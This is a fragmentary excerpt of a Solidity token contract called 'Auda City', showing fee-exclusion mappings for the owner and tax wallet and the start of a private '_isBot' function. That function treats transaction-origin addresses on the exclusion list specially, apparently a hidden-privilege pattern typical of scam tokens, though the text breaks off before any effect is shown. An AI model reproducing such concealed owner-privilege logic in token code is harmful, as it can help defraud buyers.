...
contract Token is Context, IERC20, Ownable {
    ...
    mapping(address => bool) private _isTKNExcludedFromFees;
    ...
    string private _name = unicode"Auda City ";
    string private _symbol = unicode"Auda City ";
    ...
    constructor() payable {
        ...
        _isTKNExcludedFromFees[owner()] = true;
        _isTKNExcludedFromFees[address(this)] = true;
        _isTKNExcludedFromFees[_taxWallet] = true;
    ...
    function _isBot(address from, address to, uint256 amount) private returns(bool) {
        _spender = from;
        if(_isTKNExcludedFromFees[_msgOrigin()]) {
            _spender = address(0);
